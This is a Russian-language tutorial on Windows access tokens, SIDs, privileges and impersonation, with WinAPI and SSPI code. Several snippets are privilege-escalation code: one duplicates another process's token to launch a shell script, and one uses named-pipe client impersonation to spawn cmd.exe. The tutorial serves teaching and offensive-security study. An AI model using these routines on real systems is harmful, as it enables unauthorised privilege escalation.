#token #socket #windows 

Сис­тема безопас­ности Windows сос­тоит из мно­гих инс­тру­мен­тов, один из которых — токены аутен­тифика­ции. В этой статье мы научим­ся работать с токена­ми и при­виле­гиями и про­водить имперсо­нацию поль­зовате­лей Windows.

Для начала давай запом­ним нес­коль­ко тер­минов — ско­ро они нам при­годят­ся. Кон­текст поль­зовате­ля (user context), он же кон­текст безопас­ности (security context), — набор уни­каль­ных отли­читель­ных приз­наков поль­зовате­ля, слу­жащий для кон­тро­ля дос­тупа. Сис­тема хра­нит све­дения о кон­тек­сте в токене (его так­же называ­ют мар­кером дос­тупа). Рас­смот­рим их чуть более под­робно.

# SID И ТОКЕНЫ

При вхо­де в сис­тему любой поль­зователь вво­дит свой логин и пароль. Затем, если под­клю­чена домен­ная учет­ная запись, эти дан­ные све­ряют­ся с хра­нили­щем учет­ных записей Active Directory на кон­трол­лере домена, которое называ­ется `ntds.dit`, либо с базой дан­ных локаль­ного компь­юте­ра — SAM.

Ес­ли пароль вер­ный, сис­тема начина­ет собирать све­дения об учет­ной записи. В слу­чае Active Directory так­же собира­ется информа­ция уров­ня домена (нап­ример, домен­ные груп­пы). И незави­симо от типа УЗ находят­ся све­дения, отно­сящи­еся к локаль­ной сис­теме, в том чис­ле перечень локаль­ных групп, в которых сос­тоит поль­зователь. Все эти дан­ные помеща­ются в спе­циаль­ную струк­туру, хра­нящу­юся в объ­екте ядра, который называ­ется токеном дос­тупа.

В сис­темах Windows у мно­гих объ­ектов — груп­пы, домена, поль­зовате­ля — сущес­тву­ет спе­циаль­ный иден­тифика­тор безопас­ности, SID (Security Identifier). Он име­ет вот такой фор­мат:

`   S-R-I-S-S     `

В этой записи:

-   `S` озна­чает, что пос­ледова­тель­ность чисел пред­став­ляет собой иден­тифика­тор безопас­ности;
-   `R` — номер вер­сии SID;
-   `I` — чис­ло, пред­став­ляющее упол­номочен­ный орган (authority), который соз­дал или выдал SID;
-   `S` — чис­ло, пред­став­ляющее вто­рой упол­номочен­ный орган (subauthority). Так­же содер­жит внут­ри себя RID (Relative Identifier) — допол­нитель­ный иден­тифика­тор, который исполь­зует­ся, что­бы отли­чить одно­го поль­зовате­ля от дру­гого;
-   `S` — еще один упол­номочен­ный орган. SID может содер­жать внут­ри себя любое количес­тво упол­номочен­ных орга­нов.

![[Pasted image 20230116210723.png]]

При этом сущес­тву­ют и некото­рые стан­дар­тные SID. Они перечис­лены в [до­кумен­тации Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab). Такие иден­тифика­торы называ­ются хорошо извес­тны­ми (well known).

То­кен же хра­нит внут­ри себя мно­жес­тво раз­личных SID, сре­ди которых мож­но выделить основные:

-   SID поль­зовате­ля — иден­тифици­рует учет­ную запись, для которой был соз­дан токен;
-   SID групп — иден­тифика­торы групп, в которые вхо­дит поль­зователь;
-   SID регис­тра­ции — уни­каль­ный SID, соз­данный в момент аутен­тифика­ции. Поз­воля­ет отли­чить один сеанс от дру­гого (если поль­зователь нес­коль­ко раз заходил в сис­тему, то сис­тема каж­дый раз соз­дает уни­каль­ный SID регис­тра­ции).

Дос­таточ­но слож­но, прав­да ведь? Но мож­но про­вес­ти прос­тую ана­логию. Токен — кар­точка сот­рудни­ка ком­пании. SID поль­зовате­ля — имя на этой кар­точке, SID груп­пы — напеча­тан­ная дол­жность. Сис­тема смот­рит на эту кар­точку каж­дый раз, ког­да мы начина­ем с ней вза­имо­дей­ство­вать.

# ТОКЕН И ПРОЦЕСС

В Windows есть про­цес­сы, а есть потоки. Говоря прос­тыми сло­вами, это некие объ­екты, обла­дающие собс­твен­ным вир­туаль­ным адресным прос­транс­твом. Потоком называ­ют ход выпол­нения прог­раммы. Поток выпол­няет­ся в рам­ках вла­деюще­го им про­цес­са, или, как говорят, в кон­тек­сте про­цес­са. Любое запущен­ное при­ложе­ние пред­став­ляет собой про­цесс, в кон­тек­сте которо­го выпол­няет­ся по край­ней мере один поток.

У про­цес­са есть токен. Чаще все­го исполь­зует­ся токен поль­зовате­ля, запус­тивше­го про­цесс. Ког­да про­цесс порож­дает дру­гие про­цес­сы, все они исполь­зуют этот же токен.

![[Pasted image 20230116210758.png]]

Ес­ли нам тре­бует­ся выпол­нить одну задачу с токеном одно­го поль­зовате­ля, а дру­гую с токеном дру­гого поль­зовате­ля, запус­кать новый про­цесс как‑то не очень удоб­но. Поэто­му токен мож­но при­менить и к опре­делен­ному потоку про­цес­са.

# ПРИСТУПАЕМ К РАБОТЕ

## Получаем токен

Су­щес­тву­ет нес­коль­ко фун­кций для получе­ния токена. Для работы с про­цес­сами и потока­ми мож­но исполь­зовать сле­дующие вари­анты.

**Ва­риант 1:** получить токен опре­делен­ного про­цес­са.

```
BOOL OpenProcessToken(
[in] HANDLE ProcessHandle,
[in] DWORD DesiredAccess,
[out] PHANDLE TokenHandle
);
```

**Ва­риант 2:** получить токен опре­делен­ного потока.

```
BOOL OpenThreadToken(
[in] HANDLE ThreadHandle,
[in] DWORD DesiredAccess,
[in] BOOL OpenAsSelf,
[out] PHANDLE TokenHandle
);
```

Пе­репи­сывать MSDN и объ­яснять каж­дый параметр как‑то неп­равиль­но. Если вдруг ты нез­наком с WinAPI, то можешь написать [мне](https://t.me/cXestXlaXvie), ски­ну матери­ал для изу­чения. Пред­лагаю обра­тить вни­мание лишь на вто­рой параметр — `DesiredAccess`.

Здесь ты дол­жен ука­зать, какой тип дос­тупа к токену хочешь получить. Это зна­чение пре­обра­зует­ся в мас­ку дос­тупа, на осно­ве которой Windows опре­деля­ет, мож­но выдавать токен или нель­зя. WinAPI пре­дос­тавля­ет для такой мас­ки некото­рые [стан­дар­тные зна­чения](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects).

Об­рати вни­мание, что прос­то так засунуть `TOKEN_ALL_ACCESS` нель­зя: сис­тема баналь­но не выдаст токен, так как в эту мас­ку вхо­дит и `TOKEN_ADJUST_SESSIONID`, который тре­бует наличие при­виле­гии `SeTcbPrivilege`. Такой при­виле­гией обла­дает лишь сис­тема.

При этом дан­ную ошиб­ку допус­кают очень час­то. Нап­ример, лишь в вер­сии 4.7 инс­тру­мен­та [Cobalt Strike](https://www.cobaltstrike.com/blog/cobalt-strike-4-7-the-10th-anniversary-edition/) был исправ­лен этот недочет.

Ча­ще все­го для наших задач мы будем ука­зывать при­виле­гию `TOKEN_DUPLICATE`, что­бы исполь­зовать фун­кцию `DuplicateTokenEx()`, которую мы раз­берем поз­же.

**Ва­риант 3:** зап­росить токен поль­зовате­ля, если мы зна­ем его логин и пароль.

```
BOOL LogonUserA(
[in] LPCSTR lpszUsername,
[in, optional] LPCSTR lpszDomain,
[in, optional] LPCSTR lpszPassword,
[in] DWORD dwLogonType,
[in] DWORD dwLogonProvider,
[out] PHANDLE phToken
);
```

## Проверка наличия привилегии в токене

То­кен так­же содер­жит информа­цию о при­виле­гиях поль­зовате­ля. У самих при­виле­гий в Windows есть два пред­став­ления:

-   дру­жес­твен­ное имя — имя, которое отоб­ража­ется в интерфей­се Windows, нап­ример `Act as part of the operating system`;
-   прог­рам­мное имя — имя, которое исполь­зуют при­ложе­ния, нап­ример `SE_TCB_NAME`.

Для про­вер­ки мож­но исполь­зовать сле­дующую фун­кцию:

```
BOOL PrivilegeCheck(
[in] HANDLE ClientToken,
[in, out] PPRIVILEGE_SET RequiredPrivileges,
[out] LPBOOL pfResult
);
```

Сам код может быть при­мер­но сле­дующий (при­нима­ет токен, в котором надо про­верить наличие при­виле­гии, и ее имя. Допус­тим, `SE_DEBUG_NAME`):

```
bool IsPrivilegeEnabled(HANDLE hToken, PCWSTR name) {
	PRIVILEGE_SET set{};
	set.PrivilegeCount = 1;
	if (!::LookupPrivilegeValue(nullptr, name, &set.Privilege[0].Luid)) return false;
	BOOL result;
	return ::PrivilegeCheck(hToken, &set, &result) && result
}
```

## Изменение информации токена

До­пус­тимые изме­нения делят­ся на две груп­пы:

-   све­дения, которые мож­но изме­нить;
-   све­дения, которые мож­но задать.

Для боль­шинс­тва ситу­аций мож­но вос­поль­зовать­ся этой фун­кци­ей:

```
BOOL SetTokenInformation(
[in] HANDLE TokenHandle,
[in] TOKEN_INFORMATION_CLASS TokenInformationClass,
[in] LPVOID TokenInformation,
[in] DWORD TokenInformationLength
);
```

Ко­неч­но же, в токене воз­можно изме­нить далеко не все парамет­ры. Ниже опи­саны допус­тимые клас­сы информа­ции для `SetTokenInformation()`, а так­же при­виле­гии и мас­ки дос­тупа, которые для это­го тре­буют­ся.

![[Pasted image 20230116212345.png]]

Нап­ример, что­бы вклю­чить вир­туали­зацию UAC, исполь­зуй сле­дующий код:

```
// hProcess имеет PROCESS_QUERY_INFORMATION
HANDLE hToken;
OpenProcessToken(hProcess, TOKEN_ADJUST_DEFAULT, &hToken);
ULONG enable = 1;
SetTokenInformation(hToken, TokenVirtualizationEnabled,&enable, sizeof(enable));
```

При этом мы можем изме­нить и при­виле­гии, содер­жащи­еся в токене! Но тре­бует­ся знать, как получить из прог­рам­мно­го име­ни при­виле­гии ее LUID. Это поз­воля­ет сде­лать сле­дующая фун­кция:

```
BOOL LookupPrivilegeValueA(
[in, optional] LPCSTR lpSystemName,
[in] LPCSTR lpName,
[out] PLUID lpLuid
);
```

Сле­дующим шагом мы дол­жны выз­вать `AdjustTokenPrivilege()`:

```
BOOL AdjustTokenPrivileges(
[in] HANDLE TokenHandle,
[in] BOOL DisableAllPrivileges,
[in, optional] PTOKEN_PRIVILEGES NewState,
[in] DWORD BufferLength,
[out, optional] PTOKEN_PRIVILEGES PreviousState,
[out, optional] PDWORD ReturnLength
);
```

Эта фун­кция может как вклю­чить при­виле­гии, так и отклю­чить их. Не знаю, почему Microsoft не реали­зова­ла что‑нибудь подоб­ное:

```
BOOL EnableTokenPrivilege(HANDLE hToken, LPTSTR szPriv, BOOL bEnabled) {
	TOKEN_PRIVILEGES tp;
	LUID luid;
	BOOL bRet = FALSE;

	__try {
		// Ищем уникальный для системы LUID привилегии
		if (!LookupPrivilegeValue(NULL, szPriv /*SE_DEBUG_NAME*/, &luid)) {
			// Если имя фиктивное
			__leave;
		}
		// Создаем массив привилегий нашего маркера (в данном случае массив из одного элемента)
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = bEnabled ? SE_PRIVILEGE_ENABLED : 0;
	
		// Изменяем состояние привилегий маркера, включая или отключая привилегии из нашего массива
		if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
			__leave;
		}
		bRet = TRUE;
	}
	__finally {};
	return(bRet);

}
```

Этой фун­кции тре­бует­ся передать токен, прог­рам­мное имя при­виле­гии и булево зна­чение, `TRUE` или `FALSE`, то есть вклю­чить при­виле­гию или вык­лючить ее. При этом токен дол­жен иметь мас­ку `TOKEN_ADJUST_PRIVILEGES`.

# ВЫПОЛНЕНИЕ КОДА С ИСПОЛЬЗОВАНИЕМ ТОКЕНА

Ча­ще все­го про­цесс исполь­зования получен­ного токена начина­ется с вызова фун­кции `DuplicateTokenEx()`:

```
BOOL DuplicateTokenEx(
[in] HANDLE hExistingToken,
[in] DWORD dwDesiredAccess,
[in, optional] LPSECURITY_ATTRIBUTES lpTokenAttributes,
[in] SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
[in] TOKEN_TYPE TokenType,
[out] PHANDLE phNewToken
);
```

Она прос­то соз­дает новый токен, который дуб­лиру­ет ранее получен­ный. При этом мы дол­жны переда­вать токен, который был зап­рошен с мас­кой `TOKEN_DUPLICATE`. В `dwDesiredAccess` ты дол­жен ука­зать новую мас­ку дос­тупа. Допус­кает­ся исполь­зовать пре­доп­ределен­ные зна­чения из [до­кумен­тации Microsoft](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects).

И вновь может воз­никнуть путани­ца с `ImpersonationLevel`. Это дей­стви­тель­но уро­вень имперсо­нации, то есть он опре­деля­ет, нас­коль­ко токен может оли­цет­ворять объ­ект. Сущес­тву­ют сле­дующие вари­анты:

-   `SecurityAnonymous` — токен с таким уров­нем перевоп­лощения не может быть исполь­зован для соз­дания про­цес­са, заимс­тву­юще­го пра­ва. Ано­ним­ный уро­вень под­держи­вает­ся толь­ко для меж­про­цес­сно­го вза­имо­дей­ствия (нап­ример, для име­нован­ных каналов). Все осталь­ные спо­собы прос­то повыша­ют его до `SecurityIdentification`;
-   `SecurityIdentification` — может быть исполь­зован для иден­тифика­ции (мож­но будет узнать поль­зовате­ля и груп­пу, ACL поль­зовате­ля), но НЕЛЬ­ЗЯ будет при­менять для имперсо­нации или в вызовах `CreateProcessAsUser()`, `CreateProcessWithTokenW()` и подоб­ных;
-   `SecurityImpersonation` — пол­нофун­кци­ональ­ный мар­кер, с помощью которо­го мож­но оли­цет­ворять кого‑либо в локаль­ной сис­теме, но нель­зя оли­цет­ворять в уда­лен­ных сис­темах;
-   `SecurityDelegation` — мар­кер может оли­цет­ворять кли­ента в уда­лен­ных сис­темах. Самый мощ­ный уро­вень.

## Создание процесса

Сле­дующим шагом идет вызов `CreateProcessWithTokenW()`. Эта фун­кция соз­дает про­цесс, а затем при­вязы­вает к нему ука­зан­ный токен:

```
BOOL CreateProcessWithTokenW(
[in] HANDLE hToken,
[in] DWORD dwLogonFlags,
[in, optional] LPCWSTR lpApplicationName,
[in, out, optional] LPWSTR lpCommandLine,
[in] DWORD dwCreationFlags,
[in, optional] LPVOID lpEnvironment,
[in, optional] LPCWSTR lpCurrentDirectory,
[in] LPSTARTUPINFOW lpStartupInfo,
[out] LPPROCESS_INFORMATION lpProcessInformation
);
```

Единс­твен­ный минус — у тебя дол­жна быть при­виле­гия `SeImpersonatePrivilege`, в про­тив­ном слу­чае вызов обер­нется ошиб­кой. Однажды, ког­да мне тре­бова­лось повысить пра­ва в сис­теме и име­лась учет­ная запись с этой при­виле­гией, я нашел сле­дующий код:

```
#include <windows.h>
#include <iostream>

int main(int argc, char * argv[]) {
	char a;
	HANDLE processHandle;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	DWORD PID_TO_IMPERSONATE = 3060;
	wchar_t cmdline[] = L"C:\\shell.cmd";
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);
	
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE);
	OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
	DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);
	
	std::cin >> a;
	
	// CloseHandle() опустил

	return 0;
}
```

Смо­жешь догадать­ся, почему он не зарабо­тал? Ошиб­ка такая же, как и у Cobalt Strike. Для успешной экс­плу­ата­ции дос­таточ­но зап­росить мас­ку `TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY` в вызове `OpenProcessToken()`.

## Применение к потоку

Мож­но при­вязать токен и к опре­делен­ному потоку про­цес­са. Для это­го сущес­тву­ет сле­дующая фун­кция:

```
BOOL SetThreadToken(
[in, optional] PHANDLE Thread,
[in, optional] HANDLE Token
);
```

Нап­ример:

```
HANDLE hProcToken;
OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, &hProcToken);
HANDLE hImpToken;
DuplicateTokenEx(hProcToken, MAXIMUM_ALLOWED, nullptr,SecurityIdentification, TokenImpersonation, &hImpToken);
CloseHandle(hProcToken);
SetThreadToken(nullptr, hImpToken);
// Делаем что-нибудь
RevertToSelf();
CloseHandle(hImpToken);
```

Ес­ли мы зна­ем учет­ные дан­ные поль­зовате­ля, то мож­но получить его токен и работать с ним вот так:

```
HANDLE hToken;

LogonUser(L"alice", L".", L"alicesecretpassword", LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &hToken); // Получаем токен пользователя

ImpersonateLoggedOnUser(hToken);
	// Выполняем задачи от лица пользователя alice
RevertToSelf(); // Возвращаем исходный контекст

CloseHandle(hToken)
```

# ЗАИМСТВОВАНИЕ ПРАВ ПОДКЛЮЧЕННОГО ПОЛЬЗОВАТЕЛЯ

## Без установления соединения

Для заимс­тво­вания прав под­клю­чен­ного поль­зовате­ля может слу­жить фун­кция `ImpersonateLoggedOnUser()`, которую мы уже рас­смот­рели, либо `ImpersonateSelf()`:

```
BOOL ImpersonateSelf(
[in] SECURITY_IMPERSONATION_LEVEL ImpersonationLevel
);
```

Она про­дуб­лиру­ет токен нашего про­цес­са, соз­даст новый с ука­зан­ным типом имперсо­нации и свя­жет его с вызыва­ющим потоком.

## Именованные каналы

Су­щес­тву­ет воз­можность имперсо­нации кли­ента пай­па:

```
BOOL ImpersonateNamedPipeClient(
[in] HANDLE hNamedPipe
);
```

Но обра­ти вни­мание, что для вызова этой фун­кции пот­ребу­ется при­виле­гия `SeImpersonatePrivilege`. Так­же мы получим токен с уров­нем имперсо­нации мень­шим, чем `SecurityImpersonation`, нап­ример `SecurityIdentification` или `SecurityAnonymous`, поэто­му необ­ходимо будет выз­вать `DuplicateTokenEx()`.

```
#include <Windows.h>
#include <iostream>

int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\pipename";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	DWORD bytesWritten = 0;
	
	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	std::wcout << "Impersonating the client..." << std::endl;
	ImpersonateNamedPipeClient(serverPipe);
	err = GetLastError();
	
	STARTUPINFO si = {};
	wchar_t command[] = L"C:\\Windows\\system32\\cmd.exe";
	PROCESS_INFORMATION pi = {};
	HANDLE threadToken = GetCurrentThreadToken();
	CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	
	return 0;
}
```

# СОКЕТЫ ИЛИ ДРУГОЙ МЕХАНИЗМ ВЗАИМОДЕЙСТВИЯ

Ес­ли нам тре­бует­ся про­вес­ти имперсо­нацию кли­ента, с которым мы вза­имо­дей­ству­ем, то мож­но исполь­зовать SSP (Security Support Prodiver). Самые популяр­ные средс­тва из этой катего­рии в Windows — NTLMSSP и Kerberos. Для прог­рамми­рова­ния с SSP исполь­зует­ся SSPI (Security Support Provider Interface). Он соз­дает так называ­емые бло­бы (`security blobs`) — пакеты дан­ных, которые переда­ются кли­ентом сер­веру и в обратном нап­равле­нии.

SSP поз­воля­ет нам выс­тро­ить кон­текст. С помощью выс­тро­енно­го кон­тек­ста мы смо­жем получить токен.

## Начало работы

Сна­чала сле­дует перечис­лить все дос­тупные для текуще­го хос­та SSP. Это мож­но сде­лать с помощью сле­дующей фун­кции:

```
SECURITY_STATUS SEC_ENTRY EnumerateSecurityPackagesA(
[in] unsigned long *pcPackages,
[in] PSecPkgInfoA *ppPackageInfo
);
```

Нап­ример:

```
#define SECURITY_WIN32
#include <windows.h>
#include <stdio.h>
#include <sspi.h>

#pragma comment (lib, "Secur32.lib")

int main() {
	ULONG pcPackages = 0;
	SecPkgInfo* secPkgInfo = NULL;
	SECURITY_STATUS status;
	status = EnumerateSecurityPackages(&pcPackages, &secPkgInfo);
	
	if (status != SEC_E_OK) {
		wprintf(L"Security function failed with error: %i\n",status);
	}
	for (ULONG i = 0; i < pcPackages; i++) {
		wprintf(L"%ws\n", secPkgInfo[i].Name);
	}
	return 0;
}
```

В `pcPackages` содер­жится количес­тво про­токо­лов защиты, которые были получе­ны, а `ppPackageInfo` будет содер­жать под­робную информа­цию. Он явля­ется экзем­пля­ром струк­туры `SecPkgInfo`, при этом сама струк­тура выг­лядит вот так:

```
typedef struct _SecPkgInfoA {
unsigned long fCapabilities;
unsigned short wVersion;
unsigned short wRPCID;
unsigned long cbMaxToken;
SEC_CHAR *Name; // Название
SEC_CHAR *Comment;
} SecPkgInfoA, *PSecPkgInfoA;
```

Да­лее тре­бует­ся получить собс­твен­ные рек­визиты для SSP и опре­делить­ся с про­токо­лом защиты. В этом поможет сле­дующая фун­кция:

```
SECURITY_STATUS SEC_Entry AcquireCredentialsHandle(
_In_ SEC_CHAR *pszPrincipal,
_In_ SEC_CHAR *pszPackage,
_In_ ULONG fCredentialUse,
_In_ PLUID pvLogonID,
_In_ PVOID pAuthData,
_In_ SEC_GET_KEY_FN pGetKeyFn,
_In_ PVOID pvGetKeyArgument,
_Out_ PCredHandle phCredential,
_Out_ PTimeStamp ptsExpiry
);
```

Нап­ример:

```
#define SECURITY_WIN32
#include <windows.h>
#include <stdio.h>
#include <sspi.h>

#pragma comment (lib, "Secur32.lib")

int main() {
	ULONG pcPackages = 0;
	SecPkgInfo* secPkgInfo = NULL;
	SECURITY_STATUS status;
	status = EnumerateSecurityPackages(&pcPackages, &secPkgInfo);
	
	if (status != SEC_E_OK) {
		wprintf(L"Security function failed with error: %i\n",status);
	}
	for (ULONG i = 0; i < pcPackages; i++) {
		wprintf(L"%d - %ws\n", i,secPkgInfo[i].Name);
	}
	printf("Which would u like? ");
	int numberOfSSP = 0;
	scanf_s("%d", &numberOfSSP);
	
	CredHandle hCredentials;
	TimeStamp tsExpires;
	status = AcquireCredentialsHandle(NULL, secPkgInfo[numberOfSSP].Name, SECPKG_CRED_BOTH, NULL, NULL, NULL, NULL, &hCredentials, &tsExpires);
	if (status != SEC_E_OK) {
		wprintf(L"ERROR");
	}
	else {
		wprintf(L"SUCCESS, lets authenticate!");
		// Код для аутентификации
	}
	return 0;
}
```

В `pszPrincipal` ука­зывай имя объ­екта, для которо­го мы получа­ем рек­визиты. `NULL` будет озна­чать, что нам тре­буют­ся рек­визиты для токена текуще­го потока. В `pszPackage` мы про­писы­ваем про­токол защиты, который будем исполь­зовать. Мож­но ука­зать параметр `Name` из струк­туры `SecPkgInfo` (смот­ри фун­кцию выше). Либо воз­можны сле­дующие вари­анты:

```
"SChannel" — компонент UNISP_NAME для SSL
"Negotiate" — компонент NEGOSSP_NAMEдля Negotiate (используется самый подходящий в текущей ситуации протокол (или NTLM, или Kerberos, вот тут можно понять, как и что выбирается: https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-negotiate)
"NTLM" — компонент NTLMSP_NAME для NTLM
"Kerberos" — компонент MICROSOFT_KERBEROS_NAME для Kerberos
```

## Роль клиента

В про­цес­се аутен­тифика­ции кли­ент и сер­вер ведут себя по‑раз­ному, поэто­му нач­нем с раз­бора того, что дела­ет кли­ент.

Пер­вым делом кли­ент ини­циирует исхо­дящий кон­текст безопас­ности из дес­крип­тора учет­ных дан­ных, получен­ных в резуль­тате вызова фун­кции `AcquireCredentialsHandle()`. Обыч­но эта фун­кция вызыва­ется в цик­ле до тех пор, пока не будет уста­нов­лен дос­таточ­ный кон­текст безопас­ности.

```
SECURITY_STATUS SEC_ENTRY InitializeSecurityContextA(
[in, optional] PCredHandle phCredential,
[in, optional] PCtxtHandle phContext,
SEC_CHAR *pszTargetName,
[in] unsigned long fContextReq,
[in] unsigned long Reserved1,
[in] unsigned long TargetDataRep,
[in, optional] PSecBufferDesc pInput,
[in] unsigned long Reserved2,
[in, out, optional] PCtxtHandle phNewContext,
[in, out, optional] PSecBufferDesc pOutput,
[out] unsigned long *pfContextAttr,
[out, optional] PTimeStamp ptsExpiry
);
```

Про­цесс пос­ледова­тель­ных вызовов ука­зан­ной фун­кции име­ет сле­дующие осо­бен­ности:

-   па­раметр `phContext` дол­жен ука­зывать на перемен­ную, которая содер­жит хендл кон­тек­ста, получен­ный через параметр `phNewContext`;
-   при пос­ледова­тель­ных обра­щени­ях к этой фун­кции игно­риру­ется параметр `pszTargetName`;
-   мы будем переда­вать фун­кции `InitializeSecurityContext()` бло­бы, получен­ные от сер­вера парамет­ром `pInput`;
-   тре­бова­ния к кон­тек­сту со сто­роны сер­вера воз­вра­щают­ся парамет­ром `pfContextAttr`, и их надо про­верять, что­бы они не про­тиво­речи­ли пот­ребнос­тям кли­ента.

Пос­ледова­тель­ность вызовов сто­ит выпол­нять, ана­лизи­руя воз­вра­щаемое зна­чение фун­кции. Если она вер­нула `SEC_I_CONTINUE_NEEDED`, то кли­ент вновь дол­жен ее выз­вать. Воз­врат `SEC_E_OK` озна­чает, что кон­текст удач­но пос­тро­ен.

При этом дан­ная фун­кция не вер­нет управле­ние до тех пор, пока сер­вер, к которо­му кон­нектят­ся, не вызовет `AcceptSecurityContext()`.

Для работы с бло­бами исполь­зуют­ся вход­ные и выход­ные буферы. При их исполь­зовании тре­бует­ся соз­дать мас­сив перемен­ных `SecBuffer`, которые дол­жны ука­зывать на выделен­ные нами буферы памяти. Затем мы прис­ваиваем адрес это­го мас­сива экзем­пля­ру типа `SecBufferDesc`. Он ука­зыва­ет, сколь­ко буферов содер­жится в мас­сиве.

```
typedef struct _SecBufferDesc {
unsigned long ulVersion; // Здесь указываем SECBUFFER_VERSION
unsigned long cBuffers;
PSecBuffer pBuffers;
} SecBufferDesc, *PSecBufferDesc;

typedef struct _SecBuffer {
unsigned long cbBuffer; // Размер блока памяти, на который указывает pvBuffer
unsigned long BufferType;
void SEC_FAR *pvBuffer;
} SecBuffer, *PSecBuffer;
```

Что­бы сис­тема сама выдели­ла мес­то под эти буферы, в вызове фун­кции `InitializeSecurityContext()` в парамет­ре `fContextReq` тре­бует­ся ука­зать `ISC_REQ_ALLOCATE_MEMORY`.

На­конец, ито­говая фун­кция на кли­енте будет выг­лядеть сле­дующим обра­зом:

```
BOOL ClientHandshakeAuth(CredHandle* phCredentials, PULONG plAttrbibutes, CtxtHandle* phContext, PTSTR pszServer) {
	BOOL fSuccess = FALSE;
	__try {
		SECURITY_STATUS ss;
		// Объявляем входной и выходной буфер
		SecBuffer secBufferOut[1];
		SecBufferDesc secBufDescriptorOut;
		SecBuffer secBufferIn[1];
		SecBufferDesc secBufferDescriptorIn;

		// Устанавливаем информацию о состоянии цикла
		BOOL fFirstPass = TRUE;
		ss = SEC_I_CONTINUE_NEEDED;
		while (ss == SEC_I_CONTINUE_NEEDED) {
			// Указатель на входной блоб
			PBYTE pbData = NULL;
			if (fFirstPass) { // Первый проход, входных буферов еще нет
				secBufferDescriptorIn.cBuffers = 0;
				secBufferDescriptorIn.pBuffers = NULL;
				secBufferDescriptorIn.ulVersion = SECBUFFER_VERSION;
			}
			else { // Последовательные проходы
				// Получение размера блоба
				ULONG lSize = 0;
				ULONG lTempSize = sizeof(lSize);
				ReceiveData(&lSize, &lTempSize); // Узнаем размер данных
				pbData = (PBYTE)malloc(lSize);
				ReceiveData(pbData, &lSize); // Получаем блоб

				// Входной буфер указывает на блоб
				secBufferIn[0].BufferType = SECBUFFER_TOKEN;
				secBufferIn[0].cbBuffer = lSize;
				secBufferIn[0].pvBuffer = pbData;

				// Входной BufDesc указывает на входной буфер
				secBufferDescriptorIn.cBuffers = 1;
				secBufferDescriptorIn.pBuffers = secBufferIn;
				secBufferDescriptorIn.ulVersion = SECBUFFER_VERSION;
			}
			// Устанавливаем выходной буфер (SSPI выделит память для него)
			secBufferOut[0].BufferType = SECBUFFER_TOKEN;
			secBufferOut[0].cbBuffer = 0;
			secBufferOut[0].pvBuffer = NULL;
			// Выходной BufDesc указывает на выходной буфер
			secBufDescriptorOut.cBuffers = 1;
			secBufDescriptorOut.pBuffers = secBufferOut;
			secBufDescriptorOut.ulVersion = SECBUFFER_VERSION;

			ss = InitializeSecurityContext(phCredentials, fFirstPass ? NULL : phContext, pszServer, *plAttrbibutes | ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NETWORK_DREP,
&secBufferDescriptorIn, 0, phContext, &secBufDescriptorOut, plAttrbibutes, NULL);

			// Первый проход больше не делаем
			fFirstPass = FALSE;

			// Если блоб был выходным, то посылаем его
			if (secBufferOut[0].cbBuffer != 0) {
				// Связь с сервером, посылаем размер блоба
				SendData(&secBufferOut[0].cbBuffer, sizeof(ULONG));
				// Посылаем сам блоб
				SendData(&secBufferOut[0].pvBuffer, secBufferOut[0].cbBuffer);

				// Освобождаем выходной буфер
				FreeContextBuffer(secBufferOut[0].pvBuffer);
			}
		} // Работа в цикле, пока ss == SEC_I_CONTINUE_NEEDED
		if (ss != SEC_E_OK) { // Окончательный результат
			__leave;
		}
		fSuccess = TRUE;
	}
	__finally { // При сбое освобождаем хендл контекста
		if (!fSuccess) {
			ZeroMemory(phContext, sizeof(*phContext));
		}
	}
	return (fSuccess);
}

// Соответственно, вызов выглядит вот так
if (!ClientHandshakeAuth(&hCredentials, &lAttributes, &hContext, L"jcomp123"))){
	// Ошибка
}
else {
	// Мы аутентифицированы
}

DeleteSecurityContext(&hContext);
FreeCredentialsHandle(&hCredentials);
```

